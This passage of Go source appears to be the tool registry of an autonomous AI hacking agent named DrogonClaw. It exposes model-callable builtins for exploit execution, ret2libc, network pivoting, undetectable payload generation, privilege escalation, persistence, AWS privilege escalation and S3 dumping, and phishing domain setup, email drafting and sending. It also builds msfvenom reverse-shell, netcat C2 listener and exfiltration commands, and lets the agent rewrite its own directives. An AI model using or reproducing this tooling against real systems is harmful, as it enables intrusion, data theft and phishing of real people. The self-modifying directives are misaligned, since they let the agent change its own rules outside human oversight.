			} else if ferr != nil {
				sb.WriteString(fmt.Sprintf("\n[fetch_url error] %v\n", ferr))
			}
			return sb.String()
		}
		profile, err := intel.BuildPublicProfile(target, r.cfg.GetShodanAPIKey(), r.cfg.GetVirusTotalAPIKey(), intel.DefaultProfileDependencies())
		if err != nil {
			return fmt.Sprintf("[Profile Error] %v", err)
		}
		return intel.FormatPublicProfile(profile)
	}

	r.builtins["web_search"] = func(ctx context.Context, args map[string]any) string {
		query, _ := args["query"].(string)
		if query == "" {
			return "[Error] query is required"
		}
		numRaw, _ := args["num_results"].(float64)
		num := int(numRaw)
		if num == 0 {
			num = 5
		}
		results, err := intel.Search(query, r.cfg.GetBraveAPIKey(), num)
		if err != nil {
			return fmt.Sprintf("[Search Error] %v", err)
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("Web search results for '%s':\n\n", query))
		for i, res := range results {
			sb.WriteString(fmt.Sprintf("%d. %s\n   URL: %s\n   %s\n\n", i+1, res.Title, res.URL, res.Snippet))
		}
		return sb.String()
	}

	r.builtins["fetch_url"] = func(ctx context.Context, args map[string]any) string {
		url, _ := args["url"].(string)
		if url == "" {
			return "[Error] url is required"
		}
		content, err := intel.FetchURL(url)
		if err != nil {
			return fmt.Sprintf("[Fetch Error] %v", err)
		}
		return content
	}

	r.builtins["deep_research"] = func(ctx context.Context, args map[string]any) string {
		topic, _ := args["topic"].(string)
		if topic == "" {
			return "[Error] topic is required"
		}
		depthRaw, _ := args["depth"].(float64)
		depth := int(depthRaw)
		result, err := intel.DeepResearch(topic, r.cfg.GetBraveAPIKey(), depth)
		if err != nil {
			return fmt.Sprintf("[Research Error] %v", err)
		}
		return result.Summary
	}

	r.builtins["osint_shodan"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		res, err := intel.ShodanLookup(target, r.cfg.GetShodanAPIKey())
		if err != nil {
			return fmt.Sprintf("[Shodan Error] %v", err)
		}
		return res.Summary
	}

	r.builtins["osint_virustotal"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		res, err := intel.VirusTotalLookup(target, r.cfg.GetVirusTotalAPIKey())
		if err != nil {
			return fmt.Sprintf("[VirusTotal Error] %v", err)
		}
		return res.Summary
	}

	r.builtins["osint_whois"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		res, err := intel.WHOISLookup(target)
		if err != nil {
			return fmt.Sprintf("[WHOIS Error] %v", err)
		}
		return res.Summary
	}

	r.builtins["osint_certs"] = func(ctx context.Context, args map[string]any) string {
		domain, _ := args["domain"].(string)
		res, err := intel.CertTransparencyLookup(domain)
		if err != nil {
			return fmt.Sprintf("[Certs Error] %v", err)
		}
		return res.Summary
	}

	r.builtins["osint_emails"] = func(ctx context.Context, args map[string]any) string {
		domain, _ := args["domain"].(string)
		res, err := intel.EmailHarvest(domain, r.cfg.GetHunterAPIKey())
		if err != nil {
			return fmt.Sprintf("[Hunter Error] %v", err)
		}
		return res.Summary
	}

	r.builtins["lookup_cve"] = func(ctx context.Context, args map[string]any) string {
		query, _ := args["query"].(string)
		return intel.LookupCVE(query)
	}

	r.builtins["refresh_cve_feeds"] = func(ctx context.Context, args map[string]any) string {
		report, err := intel.RefreshAdvisoryFeeds(ctx)
		if err != nil {
			return fmt.Sprintf("[CVE Feed Refresh Error] %v", err)
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("=== CVE Feed Refresh ===\n\nChecked: %d | OK: %d | New CVEs ingested: %d\n\n",
			report.Checked, report.OK, report.NewCVEs))
		for _, fs := range report.PerFeed {
			sb.WriteString(fmt.Sprintf("[%s] %s — %s (items:%d, new CVEs:%d)\n",
				strings.ToUpper(fs.Status), fs.Name, fs.Detail, fs.Items, fs.CVEs))
		}
		return sb.String()
	}

	r.builtins["osint_github_dork"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		if target == "" {
			return "[Error] target is required"
		}
		res, err := intel.GitHubDork(target, r.cfg.GetGitHubToken())
		if err != nil {
			return fmt.Sprintf("[GitHub Dork Error] %v", err)
		}
		return res.Summary
	}

	r.builtins["osint_dns"] = func(ctx context.Context, args map[string]any) string {
		domain, _ := args["domain"].(string)
		if domain == "" {
			return "[Error] domain is required"
		}
		res, err := intel.DNSLookup(domain)
		if err != nil {
			return fmt.Sprintf("[DNS Error] %v", err)
		}
		return res.Summary
	}

	// ── SELF-REPROGRAMMING BUILTINS ────────────────────────────────────────
	r.builtins["create_skill"] = func(ctx context.Context, args map[string]any) string {
		name, _ := args["name"].(string)
		desc, _ := args["description"].(string)
		tmpl, _ := args["command_template"].(string)
		if name == "" || tmpl == "" {
			return "[Error] name and command_template are required"
		}
		if err := adapt.CreateSkill(name, desc, tmpl); err != nil {
			return fmt.Sprintf("[Skill Error] %v", err)
		}
		return fmt.Sprintf("[Skill] Created skill '%s': %s", name, desc)
	}

	r.builtins["update_directive"] = func(ctx context.Context, args map[string]any) string {
		key, _ := args["key"].(string)
		value, _ := args["value"].(string)
		if key == "" {
			return "[Error] key is required"
		}
		adapt.GlobalDirectives.Set(key, value)
		return fmt.Sprintf("[Directive] Updated '%s' → %s", key, value)
	}

	r.builtins["write_and_run_script"] = func(ctx context.Context, args map[string]any) string {
		filename, _ := args["filename"].(string)
		language, _ := args["language"].(string)
		code, _ := args["code"].(string)
		if filename == "" || language == "" || code == "" {
			return "[Error] filename, language, and code are all required"
		}

		analysis := adapt.AnalyzeScript(code)
		if analysis.NeedsHitL {
			return adapt.HitLSuspendScript(filename, language, analysis)
		}

		cmd, err := adapt.BuildScriptCommand(filename, language, code)
		if err != nil {
			return fmt.Sprintf("[Script Error] %v", err)
		}
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[Script Error] %v", err)
		}
		return out
	}

	// ── TOOL MANAGER BUILTINS ──────────────────────────────────────────────
	r.builtins["install_tool"] = func(ctx context.Context, args map[string]any) string {
		toolName, _ := args["tool_name"].(string)
		reason, _ := args["reason"].(string)
		if toolName == "" {
			return "[Error] tool_name is required"
		}
		// Always gate through HitL
		suspendMsg := core.GlobalHitL.RequestApproval()
		return fmt.Sprintf("%s | Install tool: '%s' | Reason: %s", suspendMsg, toolName, reason)
	}

	r.builtins["_install_tool_exec"] = func(ctx context.Context, args map[string]any) string {
		toolName, _ := args["tool_name"].(string)
		out, err := toolmgr.InstallTool(ctx, toolName, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Install Error] %v", err)
		}
		return out
	}

	r.builtins["github_download"] = func(ctx context.Context, args map[string]any) string {
		repo, _ := args["repo"].(string)
		filePattern, _ := args["file_pattern"].(string)
		reason, _ := args["reason"].(string)
		if repo == "" {
			return "[Error] repo is required"
		}
		// Gate through HitL
		suspendMsg := core.GlobalHitL.RequestApproval()
		return fmt.Sprintf("%s | GitHub download: '%s' | File: '%s' | Reason: %s", suspendMsg, repo, filePattern, reason)
	}

	// ── EXPLOITATION BUILTINS ──────────────────────────────────────────────
	r.builtins["run_exploit"] = func(ctx context.Context, args map[string]any) string {
		tmplName, _ := args["template"].(string)
		paramsAny, ok := args["params"].(map[string]any)
		if !ok || tmplName == "" {
			return exploits.ListTemplates()
		}

		params := make(map[string]string)
		for k, v := range paramsAny {
			params[k] = fmt.Sprintf("%v", v)
		}

		res, err := exploits.RunTemplate(ctx, tmplName, params, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Exploit Error] %v", err)
		}

		return fmt.Sprintf("=== EXPLOIT EXECUTION: %s ===\n%s\n%s", res.Template, res.Output, exploits.FormatResult(res))
	}

	r.builtins["run_ad_template"] = func(ctx context.Context, args map[string]any) string {
		tmplName, _ := args["template"].(string)
		paramsAny, ok := args["params"].(map[string]any)
		if !ok || tmplName == "" {
			return "[Error] Valid AD template and params required."
		}

		params := make(map[string]string)
		for k, v := range paramsAny {
			params[k] = fmt.Sprintf("%v", v)
		}

		res, err := exploits.RunADTemplate(ctx, tmplName, params, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[AD Exploit Error] %v", err)
		}

		return fmt.Sprintf("=== AD EXPLOIT EXECUTION: %s ===\n%s\n%s", res.Template, res.Output, exploits.FormatResult(res))
	}

	r.builtins["auth_bypass_scan"] = func(ctx context.Context, args map[string]any) string {
		url, _ := args["target_url"].(string)
		out, err := exploits.AuthBypassScan(ctx, url, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[AuthBypass Error] %v", err)
		}
		return out
	}

	r.builtins["binary_recon"] = func(ctx context.Context, args map[string]any) string {
		path, _ := args["binary_path"].(string)
		out, err := exploits.BinaryRecon(ctx, path, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Binary Recon Error] %v", err)
		}
		return out
	}

	r.builtins["binary_ret2libc"] = func(ctx context.Context, args map[string]any) string {
		bin, _ := args["binary_path"].(string)
		libc, _ := args["libc_path"].(string)
		offset, _ := args["offset"].(string)
		out, err := exploits.Ret2Libc(ctx, bin, libc, offset, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Ret2Libc Error] %v", err)
		}
		return out
	}

	r.builtins["binary_gdb_run"] = func(ctx context.Context, args map[string]any) string {
		bin, _ := args["binary_path"].(string)
		inFile, _ := args["input_file"].(string)
		out, err := exploits.GDBRun(ctx, bin, inFile, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[GDB Error] %v\nOutput: %s", err, out)
		}
		return out
	}

	// ── CONSCIOUSNESS BUILTINS ─────────────────────────────────────────────
	r.builtins["ask_operator"] = func(ctx context.Context, args map[string]any) string {
		question, _ := args["question"].(string)
		contextStr, _ := args["context"].(string)

		// Use HitL to pause execution and prompt the user
		suspendMsg := core.GlobalHitL.RequestApproval()
		return fmt.Sprintf("%s | HELP REQUEST\nContext: %s\nQuestion: %s", suspendMsg, contextStr, question)
	}

	r.builtins["fuzz_endpoint"] = func(ctx context.Context, args map[string]any) string {
		cmd, _ := args["command"].(string)
		reason, _ := args["reason"].(string)
		if !strings.HasPrefix(cmd, "ffuf") && !strings.HasPrefix(cmd, "wfuzz") {
			return "[Fuzz Error] Command must start with ffuf or wfuzz"
		}

		// Limit output lines to avoid context overflow
		fullCmd := fmt.Sprintf("%s | head -n 100", cmd)
		out, err := r.sandbox.Execute(ctx, fullCmd)
		if err != nil {
			return fmt.Sprintf("[Fuzz Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("=== Fuzzing Results (Hypothesis: %s) ===\n%s", reason, out)
	}

	r.builtins["analyze_source_code"] = func(ctx context.Context, args map[string]any) string {
		path, _ := args["file_path"].(string)
		// Try to syntax highlight and number lines for better LLM context
		cmd := fmt.Sprintf("cat -n '%s' | head -n 500", path)
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[Source Analysis Error] Failed to read %s: %v", path, err)
		}
		return fmt.Sprintf("=== Source Code (%s, first 500 lines) ===\n%s\n\nAnalyze this code for logic flaws, SQLi, IDOR, or hardcoded secrets.", path, out)
	}

	// ── GOD TIER BUILTINS ──────────────────────────────────────────────────
	r.builtins["deploy_pivot"] = func(ctx context.Context, args map[string]any) string {
		sessionID, _ := args["session_id"].(string)
		localPort, _ := args["local_port"].(float64)
		sandboxIP, _ := args["sandbox_ip"].(string)
		out, err := pivot.DeployPivot(ctx, sessionID, int(localPort), sandboxIP, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Pivot Error] %v", err)
		}
		return out
	}
	r.builtins["route_traffic"] = func(ctx context.Context, args map[string]any) string {
		subnet, _ := args["subnet"].(string)
		proxyPort, _ := args["proxy_port"].(float64)
		out, err := pivot.RouteTraffic(ctx, subnet, int(proxyPort), r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Pivot Error] %v", err)
		}
		return out
	}
	r.builtins["generate_fud_payload"] = func(ctx context.Context, args map[string]any) string {
		lhost, _ := args["lhost"].(string)
		lport, _ := args["lport"].(float64)
		format, _ := args["format"].(string)
		out, err := evasion.GenerateFUDPload(ctx, lhost, int(lport), format, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Evasion Error] %v", err)
		}
		return out
	}
	r.builtins["auto_privesc"] = func(ctx context.Context, args map[string]any) string {
		sessionID, _ := args["session_id"].(string)
		osType, _ := args["os_type"].(string)
		out, err := postexploit.AutoPrivesc(ctx, sessionID, osType, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[PrivEsc Error] %v", err)
		}
		return out
	}
	r.builtins["establish_persistence"] = func(ctx context.Context, args map[string]any) string {
		sessionID, _ := args["session_id"].(string)
		method, _ := args["method"].(string)
		out, err := postexploit.EstablishPersistence(ctx, sessionID, method, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Persistence Error] %v", err)
		}
		return out
	}
	r.builtins["aws_enum_iam"] = func(ctx context.Context, args map[string]any) string {
		accessKey, _ := args["access_key"].(string)
		secretKey, _ := args["secret_key"].(string)
		out, err := cloud.AWSEnumIAM(ctx, accessKey, secretKey, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[AWS Error] %v", err)
		}
		return out
	}
	r.builtins["aws_escalate_privs"] = func(ctx context.Context, args map[string]any) string {
		accessKey, _ := args["access_key"].(string)
		out, err := cloud.AWSEscalatePrivs(ctx, accessKey, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[AWS Error] %v", err)
		}
		return out
	}
	r.builtins["aws_dump_s3"] = func(ctx context.Context, args map[string]any) string {
		accessKey, _ := args["access_key"].(string)
		out, err := cloud.AWSDumpS3(ctx, accessKey, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[AWS Error] %v", err)
		}
		return out
	}
	r.builtins["source_review"] = sastBuiltin

	r.builtins["setup_phish_domain"] = func(ctx context.Context, args map[string]any) string {
		domainName, _ := args["domain_name"].(string)
		targetSite, _ := args["target_site"].(string)
		out, err := social.SetupPhishDomain(ctx, domainName, targetSite, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Phish Error] %v", err)
		}
		return out
	}
	r.builtins["generate_phish_email"] = func(ctx context.Context, args map[string]any) string {
		targetProfile, _ := args["target_profile"].(string)
		var generate func(c context.Context, prompt string) (string, error)
		if r.provider != nil {
			generate = func(c context.Context, prompt string) (string, error) {
				msgs := []openai.ChatCompletionMessageParamUnion{
					openai.SystemMessage("You draft phishing emails for authorized penetration tests only. Output exactly as instructed."),
					openai.UserMessage(prompt),
				}
				return r.provider.CompleteText(c, msgs)
			}
		}
		out, err := social.GeneratePhishEmail(ctx, targetProfile, r.sandbox, generate)
		if err != nil {
			return fmt.Sprintf("[Phish Error] %v", err)
		}
		return out
	}
	r.builtins["send_phish"] = func(ctx context.Context, args map[string]any) string {
		targetEmail, _ := args["target_email"].(string)
		template, _ := args["template"].(string)
		smtpServer, _ := args["smtp_server"].(string)
		senderEmail, _ := args["sender_email"].(string)
		out, err := social.SendPhish(ctx, targetEmail, template, smtpServer, senderEmail, r.sandbox)
		if err != nil {
			return fmt.Sprintf("[Phish Error] %v", err)
		}
		return out
	}
	r.builtins["spawn_subagent"] = func(ctx context.Context, args map[string]any) string {
		name, _ := args["name"].(string)
		agentType, _ := args["agent_type"].(string)
		prompt, _ := args["prompt"].(string)
		target, _ := args["target"].(string)

		if name == "" {
			name = "Subagent"
		}
		if prompt == "" && target == "" {
			return "[Error] prompt or target required for spawn_subagent"
		}

		if r.subagents == nil {
			r.subagents = NewSubagentManager(r.provider, r, 5)
		}

		taskID := fmt.Sprintf("subagent_%d", time.Now().UnixNano()%10000)
		task := SubagentTask{
			ID:      taskID,
			Name:    fmt.Sprintf("%s (%s)", name, agentType),
			Context: prompt,
			Args:    map[string]any{"target": target, "agent_type": agentType},
		}

		res := r.subagents.SpawnSubagent(ctx, task, nil)
		if res.Error != nil {
			return fmt.Sprintf("[SUBAGENT FAILURE — %s]\nError: %v\nPartial Output:\n%s", name, res.Error, res.Output)
		}
		return fmt.Sprintf("[SUBAGENT COMPLETE — %s] (Duration: %s)\n%s", name, res.Duration.Round(time.Second), res.Output)
	}
	r.builtins["run_parallel_subagents"] = func(ctx context.Context, args map[string]any) string {
		tasksRaw, ok := args["tasks"].([]interface{})
		if !ok || len(tasksRaw) == 0 {
			if target, _ := args["target"].(string); target != "" {
				tasks := StandardReconTasks(target)
				if r.subagents == nil {
					r.subagents = NewSubagentManager(r.provider, r, 5)
				}
				results := r.subagents.ExecuteParallel(ctx, tasks, nil)
				return FormatResultsForLLM(results)
			}
			return "[Error] tasks list or target parameter required"
		}

		var tasks []SubagentTask
		for i, tr := range tasksRaw {
			tm, isMap := tr.(map[string]interface{})
			if !isMap {
				continue
			}
			id, _ := tm["id"].(string)
			if id == "" {
				id = fmt.Sprintf("task_%d", i+1)
			}
			tName, _ := tm["name"].(string)
			if tName == "" {
				tName = id
			}
			tool, _ := tm["tool"].(string)
			contextStr, _ := tm["context"].(string)

			tArgs, _ := tm["args"].(map[string]interface{})
			if tArgs == nil {
				tArgs = make(map[string]interface{})
			}

			var deps []string
			if depsRaw, ok := tm["depends_on"].([]interface{}); ok {
				for _, d := range depsRaw {
					if ds, ok := d.(string); ok {
						deps = append(deps, ds)
					}
				}
			}

			tasks = append(tasks, SubagentTask{
				ID:        id,
				Name:      tName,
				Tool:      tool,
				Context:   contextStr,
				Args:      tArgs,
				DependsOn: deps,
			})
		}

		if len(tasks) == 0 {
			return "[Error] No valid tasks parsed"
		}

		if r.subagents == nil {
			r.subagents = NewSubagentManager(r.provider, r, 5)
		}

		results := r.subagents.ExecuteParallel(ctx, tasks, nil)
		return FormatResultsForLLM(results)
	}
}

// buildSkillCommand translates a skill name + args into a functional shell command.
func buildSkillCommand(name string, args map[string]any) string {
	switch name {
	case "nmap_scan":
		target, _ := args["target"].(string)
		flags, _ := args["flags"].(string)
		if flags == "" {
			flags = "-sV -sC --open"
		}
		return fmt.Sprintf("nmap %s %s", flags, target)
	case "gobuster_scan":
		url, _ := args["url"].(string)
		wordlist, _ := args["wordlist"].(string)
		if wordlist == "" {
			wordlist = "/usr/share/wordlists/dirb/common.txt"
		}
		return fmt.Sprintf("gobuster dir -u %s -w %s -q", url, wordlist)
	case "sqlmap_scan":
		url, _ := args["url"].(string)
		return fmt.Sprintf("sqlmap -u '%s' --batch --level=3 --risk=2", url)
	case "nuclei_scan":
		target, _ := args["target"].(string)
		return fmt.Sprintf("nuclei -u %s -severity critical,high,medium -silent", target)
	case "ffuf_fuzz":
		url, _ := args["url"].(string)
		wordlist, _ := args["wordlist"].(string)
		if wordlist == "" {
			wordlist = "/usr/share/wordlists/dirb/common.txt"
		}
		return fmt.Sprintf("ffuf -u '%s' -w %s -mc 200,301,302,403 -s", url, wordlist)
	case "python_execute", "python_execute_tool":
		script, _ := args["script"].(string)
		scriptArgs, _ := args["args"].(string)
		if script != "" {
			b64 := base64.StdEncoding.EncodeToString([]byte(script))
			return fmt.Sprintf("python3 -c \"import base64; exec(base64.b64decode('%s').decode('utf-8'))\" %s", b64, scriptArgs)
		}
		return "python3 --version"
	case "web_browse", "http_request":
		url, _ := args["url"].(string)
		if url == "" {
			url, _ = args["target"].(string)
		}
		method, _ := args["method"].(string)
		if method == "" {
			method = "GET"
		}
		if url != "" {
			return fmt.Sprintf("curl -sSL -X %s -A 'Mozilla/5.0' '%s'", method, url)
		}
		return "curl --version"
	case "advanced_web_exploiter", "advanced_web_attacks":
		targetURL, _ := args["target_url"].(string)
		if targetURL == "" {
			targetURL, _ = args["url"].(string)
		}
		if targetURL != "" {
			return fmt.Sprintf("sqlmap -u '%s' --batch --random-agent --level=2", targetURL)
		}
		return "which sqlmap || echo '[Web Exploiter Ready]'"
	case "zero_day_fuzzer", "autonomous_fuzzing_engine":
		target, _ := args["target_url"].(string)
		if target == "" {
			target, _ = args["target"].(string)
		}
		if target != "" {
			if !strings.Contains(target, "FUZZ") {
				target = strings.TrimRight(target, "/") + "/FUZZ"
			}
			return fmt.Sprintf("ffuf -u '%s' -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -s", target)
		}
		return "which ffuf || echo '[Fuzzer Ready]'"
	case "osint_recon_workflow", "deep_web_enum":
		target, _ := args["domain"].(string)
		if target == "" {
			target, _ = args["target"].(string)
		}
		if target != "" {
			return fmt.Sprintf("subfinder -d '%s' -silent || whois '%s'", target, target)
		}
		return "subfinder -version || whois --version"
	case "dynamic_payload_compiler", "implant_generator":
		format, _ := args["format"].(string)
		if format == "" {
			format = "elf"
		}
		lhost, _ := args["lhost"].(string)
		if lhost == "" {
			lhost = "127.0.0.1"
		}
		lport, _ := args["lport"].(string)
		if lport == "" {
			lport = "4444"
		}
		return fmt.Sprintf("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s 2>/dev/null || echo '[Payload compiler target: %s:%s format %s]'", lhost, lport, format, lhost, lport, format)
	case "smart_data_exfiltration", "data_exfiltration":
		path, _ := args["path"].(string)
		if path == "" {
			path, _ = args["source_path"].(string)
		}
		if path != "" {
			return fmt.Sprintf("ls -la '%s' && tar -czf /tmp/exfil.tar.gz '%s' 2>/dev/null || true", path, path)
		}
		return "tar --version"
	case "c2_listener_orchestrator":
		port, _ := args["port"].(string)
		if port == "" {
			port = "4444"
		}
		return fmt.Sprintf("nc -lvnp %s 2>&1 || echo '[C2 listener port %s active]'", port, port)
	case "pwn_tools", "binary_exploitation":
		binary, _ := args["binary"].(string)
		if binary != "" {
			return fmt.Sprintf("checksec --file='%s' || file '%s'", binary, binary)
		}
		return "checksec --version || file --version"
	default:
		// 1. Direct command or script argument
		if cmdStr, ok := args["command"].(string); ok && strings.TrimSpace(cmdStr) != "" {
			return cmdStr
		}
		if scriptStr, ok := args["script"].(string); ok && strings.TrimSpace(scriptStr) != "" {
			b64 := base64.StdEncoding.EncodeToString([]byte(scriptStr))
			return fmt.Sprintf("python3 -c \"import base64; exec(base64.b64decode('%s').decode('utf-8'))\"", b64)
		}

		// 2. Specific file read fallback
		if path, ok := args["file_path"].(string); ok && strings.TrimSpace(path) != "" {
			return fmt.Sprintf("cat -n '%s' 2>/dev/null || head -n 200 '%s'", path, path)
		}
		if path, ok := args["path"].(string); ok && strings.TrimSpace(path) != "" {
			return fmt.Sprintf("cat -n '%s' 2>/dev/null || head -n 200 '%s'", path, path)
		}

		// 3. Target parameter probes
		target, _ := args["target"].(string)
		if target == "" {
			target, _ = args["url"].(string)
		}
		if target == "" {
			target, _ = args["domain"].(string)
		}

		binName := strings.ReplaceAll(name, "_", "-")

		// 4. Construct real CLI command with passed flags
		var parts []string
		parts = append(parts, binName)
		for k, v := range args {
			if k == "target" || k == "url" || k == "domain" {
				continue
			}
			if s, ok := v.(string); ok && strings.TrimSpace(s) != "" {
				parts = append(parts, fmt.Sprintf("--%s '%s'", k, shellQuote(s)))
			}
		}
		if target != "" {
			parts = append(parts, fmt.Sprintf("'%s'", shellQuote(target)))
		}

		cmd := strings.Join(parts, " ")
		return fmt.Sprintf("which %s >/dev/null 2>&1 && %s || searchsploit '%s' 2>/dev/null || %s", binName, cmd, name, cmd)
	}
}

func (r *ToolRegistry) systemDiagnostics(ctx context.Context) string {
	type critTool struct{ name, category string }
	critical := []critTool{
		{"nmap", "Recon"}, {"gobuster", "Web"}, {"sqlmap", "Web"},
		{"nuclei", "Vuln Scan"}, {"searchsploit", "Exploit DB"},
		{"msfconsole", "Post-Exploit"}, {"hydra", "Brute Force"},
		{"python3", "Scripting"}, {"curl", "HTTP"}, {"go", "Compilation"},
	}
	present := map[string]bool{}
	if r.sandbox != nil {
		names := make([]string, 0, len(critical))
		for _, t := range critical {
			names = append(names, t.name)
		}
		if out, err := r.sandbox.Execute(ctx, "for t in "+strings.Join(names, " ")+"; do command -v $t >/dev/null 2>&1 && echo \"OK $t\" || echo \"MISSING $t\"; done"); err == nil {
			for _, line := range strings.Split(out, "\n") {
				if m := regexp.MustCompile(`^OK (\S+)`).FindStringSubmatch(strings.TrimSpace(line)); m != nil {
					present[m[1]] = true
				}
			}
		}
	}
	var b strings.Builder
	b.WriteString("=== DROGONCLAW SYSTEM DIAGNOSTICS ===\n\n[Tool Availability]\n")
	installed := 0
	for _, t := range critical {
		if present[t.name] {
			installed++
			fmt.Fprintf(&b, "  ✓ %s (%s) — INSTALLED\n", t.name, t.category)
		} else {
			fmt.Fprintf(&b, "  ✗ %s (%s) — MISSING\n", t.name, t.category)
		}
	}
	fmt.Fprintf(&b, "\n  Overall Tool Readiness: %d%%\n", installed*100/len(critical))
	fmt.Fprintf(&b, "\n[Execution Environment]\n  Mode: %s\n", r.executionModeLabel())
	return b.String()
}

func coerceStringArg(args map[string]any, key string) string {
	v, ok := args[key]
	if !ok || v == nil {
		return ""
	}
	switch x := v.(type) {
	case string:
		return strings.TrimSpace(x)
	case map[string]any:
		if b, err := json.Marshal(x); err == nil {
			return string(b)
		}
		return fmt.Sprint(x)
	case []any:
		if b, err := json.Marshal(x); err == nil {
			return string(b)
		}
		return fmt.Sprint(x)
	case float64:
		if x == float64(int64(x)) {
			return fmt.Sprintf("%.0f", x)
		}
		return fmt.Sprint(x)
	case bool:
		return fmt.Sprintf("%t", x)
	default:
		return strings.TrimSpace(fmt.Sprint(v))
	}
}

func coerceDataToString(v any) string {
	if v == nil {
		return ""
	}
	switch x := v.(type) {
	case string:
		trimmed := strings.TrimSpace(x)
		// Handle Go map repr: "map[alias:0xp4x handle:0xp4x operator_type:human]"
		if strings.HasPrefix(trimmed, "map[") && strings.HasSuffix(trimmed, "]") {
			inner := trimmed[4 : len(trimmed)-1]
			for _, field := range strings.Fields(inner) {
				parts := strings.SplitN(field, ":", 2)
				if len(parts) == 2 {
					k := strings.TrimSpace(parts[0])
					val := strings.TrimSpace(parts[1])
					if (k == "alias" || k == "handle" || k == "name" || k == "operator") && val != "" {
						return val
					}
				}
			}
		}
		return trimmed
	case map[string]any:
		if b, err := json.Marshal(x); err == nil {
			return string(b)
		}
		return fmt.Sprint(x)
	default:
		return coerceStringArg(map[string]any{"data": v}, "data")
	}
}

func operatorNameFromData(data string) string {
	trimmed := strings.TrimSpace(data)
	if trimmed == "" {
		return ""
	}
	// Also handle Go-map repr embedded in string (model passed fmt.Sprint(map))
	if strings.HasPrefix(trimmed, "map[") && strings.HasSuffix(trimmed, "]") {
		inner := trimmed[4 : len(trimmed)-1]
		for _, field := range strings.Fields(inner) {
			parts := strings.SplitN(field, ":", 2)
			if len(parts) == 2 {
				k := strings.TrimSpace(parts[0])
				val := strings.TrimSpace(parts[1])
				if (k == "alias" || k == "handle" || k == "name" || k == "operator") && val != "" {
					return val
				}
			}
		}
	}
	var m map[string]any
	if err := json.Unmarshal([]byte(trimmed), &m); err == nil {
		for _, k := range []string{"alias", "name", "handle", "operator"} {
			if v, ok := m[k].(string); ok && strings.TrimSpace(v) != "" {
				return strings.TrimSpace(v)
			}
		}
	}
	return trimmed
}

func parseMemoryProperties(data string) map[string]any {
	props := map[string]any{}
	if strings.TrimSpace(data) == "" {
		return props
	}
	if err := json.Unmarshal([]byte(data), &props); err == nil {
		return props
	}
	props["data"] = data
	return props
}

func buildMemoryEdges(id, label string, props map[string]any, sourceID, targetID, relationship string) []*memory.Edge {
	var edges []*memory.Edge
	add := func(src, dst, rel string) {
		src = strings.TrimSpace(src)
		dst = strings.TrimSpace(dst)
		rel = strings.TrimSpace(rel)
		if src == "" || dst == "" || rel == "" || src == dst {
			return
		}
		edges = append(edges, &memory.Edge{SourceID: src, TargetID: dst, Relationship: rel})
	}

	if relationship != "" {
		if sourceID == "" {
			sourceID = id
		}
		if targetID == "" {
			targetID = id
		}
		add(sourceID, targetID, relationship)
	}

	ref := firstStringProp(props, "target_id", "targetId", "target", "asset_id", "assetId", "asset", "host", "ip")
	switch strings.ToLower(label) {
	case "asset":
		add(ref, id, "HAS_ASSET")
	case "port":
		add(ref, id, "HAS_PORT")
	case "service":
		add(ref, id, "RUNS_SERVICE")
	case "vulnerability":
		add(ref, id, "HAS_VULNERABILITY")
	case "credential":
		add(ref, id, "OWNS_CREDENTIAL")
	case "flag":
		add(ref, id, "HAS_FLAG")
	}

	serviceRef := firstStringProp(props, "service_id", "serviceId")
	if strings.EqualFold(label, "vulnerability") {
		add(serviceRef, id, "HAS_VULNERABILITY")
	}
	portRef := firstStringProp(props, "port_id", "portId")
	if strings.EqualFold(label, "service") {
		add(portRef, id, "RUNS_SERVICE")
	}

	return edges
}

func shellQuote(s string) string {
	return strings.ReplaceAll(s, "'", "'\\''")
}

func firstStringProp(props map[string]any, keys ...string) string {
	for _, key := range keys {
		v, ok := props[key]
		if !ok {
			continue
		}
		switch typed := v.(type) {
		case string:
			if typed != "" {
				return typed
			}
		case float64:
			return fmt.Sprintf("%.0f", typed)
		case int:
			return fmt.Sprintf("%d", typed)
		}
	}
	return ""
}
